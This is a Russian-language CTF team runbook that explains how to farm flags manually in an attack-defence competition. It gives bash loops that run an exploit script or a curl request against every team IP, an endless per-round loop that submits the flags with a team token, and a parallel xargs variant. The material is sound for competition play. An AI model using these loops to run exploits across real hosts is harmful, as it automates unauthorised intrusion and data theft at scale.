# 06 — Фарм РУКАМИ (если ферма не поднялась)

У тебя есть рабочая команда/скрипт, который вытаскивает флаг с ОДНОГО хоста. Задача —
прогнать его по всем командам и сдать всё. Чистый bash, без нашего Python.

## Прогнать эксплойт по всем командам
```bash
# teams.txt — список IP (см. 01_recon.md)
# exploit.py <IP> печатает флаги в stdout
> flags.txt
for ip in $(cat teams.txt); do
  python3 exploits/exploit.py "$ip" 2>/dev/null >> flags.txt
done
sort -u flags.txt -o flags.txt          # убрать дубли
wc -l flags.txt
```

## Если эксплойт — это curl-однострочник
```bash
> flags.txt
for ip in $(cat teams.txt); do
  curl -s "http://$ip:PORT/note/1" | grep -oE '[A-Z0-9]{31}=' >> flags.txt
done
sort -u flags.txt -o flags.txt
```

## Крутить каждый раунд (бесконечный цикл)
```bash
while true; do
  > flags.txt
  for ip in $(cat teams.txt); do
    python3 exploits/exploit.py "$ip" 2>/dev/null >> flags.txt
  done
  sort -u flags.txt | while read f; do
    # подставь свою команду сдачи из 02_flag_submit.md
    curl -s -X PUT "$URL" -H "X-Team-Token: $TOKEN" -H 'Content-Type: application/json' -d "[\"$f\"]"
  done
  sleep 60        # = длина раунда
done
```

## Параллельно (быстрее, если команд много)
```bash
cat teams.txt | xargs -P 20 -I{} python3 exploits/exploit.py {} 2>/dev/null | sort -u > flags.txt
```

## Сдать всё из файла
См. `02_flag_submit.md` → «Сдать МНОГО флагов из файла».

> Как только руками заработало — проще поднять нашу ферму (`python farm/server.py`):
> она делает ровно это, но с дедупом, повторными попытками и авто-сдачей.
